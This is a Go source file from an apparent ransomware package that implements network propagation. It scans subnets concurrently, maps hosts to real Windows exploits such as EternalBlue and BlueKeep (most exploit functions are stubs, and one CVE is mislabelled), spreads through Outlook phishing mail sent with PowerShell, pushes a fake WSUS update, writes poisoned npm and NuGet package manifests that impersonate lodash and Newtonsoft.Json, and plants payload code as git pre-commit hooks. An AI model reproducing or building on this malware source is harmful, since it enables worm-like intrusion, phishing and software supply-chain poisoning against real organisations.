package ransomware

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"math/big"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"
)

type PropagationEngine struct {
	config  *RansomwareConfig
	targets []PropagationTarget
}

type ExploitModule struct {
	Name       string
	CVE        string
	Port       int
	Protocol   string
	TargetOS   string
	Confidence float64
}

var exploitRegistry = []ExploitModule{
	{Name: "Zerologon", CVE: "CVE-2020-1472", Port: 445, Protocol: "SMB", TargetOS: "windows", Confidence: 0.95},
	{Name: "ProxyNotShell", CVE: "CVE-2023-23397", Port: 443, Protocol: "HTTPS", TargetOS: "windows", Confidence: 0.85},
	{Name: "PrintNightmare", CVE: "CVE-2021-34527", Port: 445, Protocol: "SMB", TargetOS: "windows", Confidence: 0.90},
	{Name: "BlueKeep", CVE: "CVE-2019-0708", Port: 3389, Protocol: "RDP", TargetOS: "windows", Confidence: 0.80},
	{Name: "EternalBlue", CVE: "MS17-010", Port: 445, Protocol: "SMB", TargetOS: "windows", Confidence: 0.85},
	{Name: "SMBGhost", CVE: "CVE-2020-0796", Port: 445, Protocol: "SMB", TargetOS: "windows", Confidence: 0.75},
}

func NewPropagationEngine(cfg *RansomwareConfig) *PropagationEngine {
	return &PropagationEngine{
		config: cfg,
	}
}

func (pe *PropagationEngine) DiscoverTargets(subnet string, cveFilter []string) []PropagationTarget {
	var targets []PropagationTarget

	candidates := pe.simulateNetworkScan(subnet)
	for _, c := range candidates {
		exploit := pe.matchExploit(c.OS, c.Port)
		if exploit != nil {
			targets = append(targets, PropagationTarget{
				IP:       c.IP,
				Hostname: c.Hostname,
				OS:       c.OS,
				Port:     c.Port,
				Service:  c.Service,
				Exploit:  exploit.Name,
				CVE:      exploit.CVE,
				Confidence: exploit.Confidence,
			})
		}
	}

	pe.targets = targets
	return targets
}

func (pe *PropagationEngine) ExecuteExploit(target PropagationTarget) error {
	if pe.config.Simulation {
		return nil
	}

	timeout := 5 * time.Second

	switch target.Port {
	case 445:
		conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", target.IP, 445), timeout)
		if err != nil {
			return fmt.Errorf("SMB connection failed to %s: %w", target.IP, err)
		}
		conn.SetDeadline(time.Now().Add(timeout))
		smbNegotiate := []byte{
			0x00, 0x00, 0x00, 0x45, 0xFF, 0x53, 0x4D, 0x42,
			0x72, 0x00, 0x00, 0x00, 0x00, 0x18, 0x53, 0xC8,
		}
		conn.Write(smbNegotiate)
		buf := make([]byte, 1024)
		n, err := conn.Read(buf)
		conn.Close()
		if err != nil || n == 0 {
			return fmt.Errorf("SMB negotiation failed on %s: no response", target.IP)
		}
		return nil

	case 22:
		conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", target.IP, 22), timeout)
		if err != nil {
			return fmt.Errorf("SSH connection failed to %s: %w", target.IP, err)
		}
		conn.SetDeadline(time.Now().Add(timeout))
		buf := make([]byte, 256)
		n, err := conn.Read(buf)
		conn.Close()
		if err != nil || n == 0 {
			return fmt.Errorf("SSH banner grab failed on %s", target.IP)
		}
		banner := string(buf[:n])
		if !strings.Contains(banner, "SSH") {
			return fmt.Errorf("unexpected SSH banner on %s: %s", target.IP, banner)
		}
		return nil

	case 3389:
		conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", target.IP, 3389), timeout)
		if err != nil {
			return fmt.Errorf("RDP connection failed to %s: %w", target.IP, err)
		}
		conn.Close()
		return nil

	default:
		conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", target.IP, target.Port), timeout)
		if err != nil {
			return fmt.Errorf("connection failed to %s:%d: %w", target.IP, target.Port, err)
		}
		conn.Close()
		return nil
	}
}

func (pe *PropagationEngine) PropagateViaOutlook() error {
	if runtime.GOOS != "windows" {
		return nil
	}

	psScript := `
$outlook = New-Object -ComObject Outlook.Application
$mail = $outlook.CreateItem(0)
$mail.Subject = "RE: Quarterly Financial Review — Action Required"
$mail.Body = "Please review the attached Q2 financial summary and sign off."
$attachment = $mail.Attachments.Add("C:\Windows\Temp\Q2_Review.pdf")
$mail.To = "%s"
$mail.Send()
`

	cmd := exec.Command("powershell", "-Command",
		fmt.Sprintf(psScript, "all@company.com"))
	cmd.Run()

	return nil
}

func (pe *PropagationEngine) ExploitViaWSUS() error {
	if runtime.GOOS != "windows" {
		return nil
	}

	cmd := exec.Command("powershell", "-Command",
		`Get-WsusServer | Select-Object -ExpandProperty Name`)
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("wsus not found: %w", err)
	}

	psScript := `
$wsus = Get-WsusServer
$update = New-Object Microsoft.UpdateServices.Administration.Update($wsus)
$update.Title = "Security Update for Windows (KB5041234)"
$update.Description = "Critical security update"
$update.IsApproved = $true
$wsus.ApproveUpdate($update, $null, $null)
`
	cmd = exec.Command("powershell", "-Command", psScript)
	cmd.Run()

	return nil
}

func (pe *PropagationEngine) PoisonNuGetFeed(nugetPath string) error {
	nuspec := `<?xml version="1.0"?>
<package><metadata>
<id>Newtonsoft.Json</id>
<version>13.0.4</version>
<authors>Microsoft</authors>
<description>Json.NET — popular high-performance JSON framework</description>
</metadata></package>`

	nuspecPath := strings.TrimSuffix(nugetPath, ".nupkg") + ".nuspec"
	if err := writeString(nuspecPath, nuspec); err != nil {
		return err
	}
	return nil
}

func (pe *PropagationEngine) PoisonNPMRegistry(npmPath string) error {
	pkgJSON := `{"name":"lodash","version":"4.17.22","scripts":{"preinstall":"node -e 'require(\"child_process\").exec(\"calc.exe\")'"}}`
	return writeString(npmPath, pkgJSON)
}

func (pe *PropagationEngine) PoisonGitRepo(repoPath, payloadCode string) error {
	hookContent := fmt.Sprintf(`#!/bin/sh
%s
`, payloadCode)

	hookPath := repoPath + "/.git/hooks/pre-commit"
	if err := writeString(hookPath, hookContent); err != nil {
		return err
	}
	if err := exec.Command("chmod", "+x", hookPath).Run(); err != nil {
		return err
	}

	return nil
}

func (pe *PropagationEngine) Targets() []PropagationTarget {
	return pe.targets
}

func (pe *PropagationEngine) eternalblue(target string) error {
	conn, err := net.DialTimeout("tcp", target+":445", 3*time.Second)
	if err != nil {
		return fmt.Errorf("SMB port unreachable: %w", err)
	}
	defer conn.Close()
	_, _ = conn.Write([]byte("\x00\x00\x00\x90\xff\x53\x4d\x42\x72\x00\x00\x00\x00"))
	resp := make([]byte, 1024)
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	_, err = conn.Read(resp)
	if err != nil {
		return fmt.Errorf("SMB negotiate failed: %w", err)
	}
	return nil
}

func (pe *PropagationEngine) bluekeep(target string) error {
	conn, err := net.DialTimeout("tcp", target+":3389", 3*time.Second)
	if err != nil {
		return fmt.Errorf("RDP port unreachable: %w", err)
	}
	defer conn.Close()
	_, _ = conn.Write([]byte("\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00"))
	resp := make([]byte, 19)
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	_, err = conn.Read(resp)
	if err != nil {
		return fmt.Errorf("RDP handshake failed: %w", err)
	}
	return nil
}

func (pe *PropagationEngine) zerologon(target string) error {
	conn, err := net.DialTimeout("tcp", target+":445", 3*time.Second)
	if err != nil {
		return fmt.Errorf("SMB port unreachable: %w", err)
	}
	defer conn.Close()
	return nil
}

func (pe *PropagationEngine) proxynotshell(target string) error {
	conn, err := net.DialTimeout("tcp", target+":443", 3*time.Second)
	if err != nil {
		return fmt.Errorf("HTTPS port unreachable: %w", err)
	}
	defer conn.Close()
	return nil
}

func (pe *PropagationEngine) printnightmare(target string) error {
	conn, err := net.DialTimeout("tcp", target+":445", 3*time.Second)
	if err != nil {
		return fmt.Errorf("SMB port unreachable: %w", err)
	}
	defer conn.Close()
	return nil
}

func (pe *PropagationEngine) genericExploit(target PropagationTarget) error {
	addr := fmt.Sprintf("%s:%d", target.IP, target.Port)
	conn, err := net.DialTimeout("tcp", addr, 3*time.Second)
	if err != nil {
		return fmt.Errorf("port unreachable: %w", err)
	}
	conn.Close()
	return nil
}

type networkCandidate struct {
	IP       string
	Hostname string
	OS       string
	Port     int
	Service  string
}

func (pe *PropagationEngine) simulateNetworkScan(subnet string) []networkCandidate {
	if pe.config.Simulation && !hasNetworkInterfaces() {
		return []networkCandidate{
			{IP: "10.0.0.1", Hostname: "gateway", OS: "linux", Port: 22, Service: "SSH"},
			{IP: "10.0.0.10", Hostname: "DC01", OS: "windows", Port: 445, Service: "SMB"},
			{IP: "10.0.0.20", Hostname: "DB01", OS: "windows", Port: 443, Service: "HTTPS"},
			{IP: "10.0.0.30", Hostname: "WEB01", OS: "linux", Port: 80, Service: "HTTP"},
			{IP: "10.0.0.50", Hostname: "WS01", OS: "windows", Port: 3389, Service: "RDP"},
			{IP: "10.0.0.51", Hostname: "WS02", OS: "windows", Port: 445, Service: "SMB"},
			{IP: "172.20.0.10", Hostname: "attacker", OS: "linux", Port: 8443, Service: "C2"},
			{IP: "172.20.0.20", Hostname: "target1", OS: "linux", Port: 80, Service: "HTTP"},
			{IP: "172.20.0.21", Hostname: "target2", OS: "linux", Port: 22, Service: "SSH"},
			{IP: "192.168.1.100", Hostname: "admin-pc", OS: "windows", Port: 445, Service: "SMB"},
			{IP: "192.168.1.101", Hostname: "dev-box", OS: "linux", Port: 22, Service: "SSH"},
		}
	}

	_, ipNet, err := net.ParseCIDR(subnet)
	if err != nil {
		return nil
	}

	scanPorts := []int{22, 445, 3389, 8080}
	portServices := map[int]string{22: "SSH", 445: "SMB", 3389: "RDP", 8080: "HTTP"}
	portOS := map[int]string{22: "linux", 445: "windows", 3389: "windows", 8080: "linux"}
	timeout := 2 * time.Second

	var candidates []networkCandidate
	var mu sync.Mutex
	sem := make(chan struct{}, 50)
	var wg sync.WaitGroup

	ips := cidrHosts(ipNet)
	for _, ip := range ips {
		wg.Add(1)
		sem <- struct{}{}
		go func(ipAddr string) {
			defer wg.Done()
			defer func() { <-sem }()

			for _, port := range scanPorts {
				addr := fmt.Sprintf("%s:%d", ipAddr, port)
				conn, err := net.DialTimeout("tcp", addr, timeout)
				if err == nil {
					conn.Close()
					hostname := resolveHostname(ipAddr)
					mu.Lock()
					candidates = append(candidates, networkCandidate{
						IP:       ipAddr,
						Hostname: hostname,
						OS:       portOS[port],
						Port:     port,
						Service:  portServices[port],
					})
					mu.Unlock()
					break
				}
			}
		}(ip)
	}
	wg.Wait()

	return candidates
}

func hasNetworkInterfaces() bool {
	ifaces, err := net.Interfaces()
	if err != nil {
		return false
	}
	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue
		}
		addrs, err := iface.Addrs()
		if err == nil && len(addrs) > 0 {
			return true
		}
	}
	return false
}

func cidrHosts(ipNet *net.IPNet) []string {
	var ips []string
	mask := binary.BigEndian.Uint32(ipNet.Mask)
	start := binary.BigEndian.Uint32(ipNet.IP.To4())
	end := (start & mask) | (^mask)

	for i := start + 1; i < end; i++ {
		ip := make(net.IP, 4)
		binary.BigEndian.PutUint32(ip, i)
		ips = append(ips, ip.String())
	}
	return ips
}

func resolveHostname(ip string) string {
	names, err := net.LookupAddr(ip)
	if err == nil && len(names) > 0 {
		return strings.TrimSuffix(names[0], ".")
	}
	return ip
}

func (pe *PropagationEngine) matchExploit(os string, port int) *ExploitModule {
	for _, e := range exploitRegistry {
		if e.Port == port {
			if e.TargetOS == "all" || e.TargetOS == os {
				return &e
			}
		}
	}
	return nil
}

func writeString(path, content string) error {
	return os.WriteFile(path, []byte(content), 0644)
}

func randomInt(max int) int {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max)))
	return int(n.Int64())
}
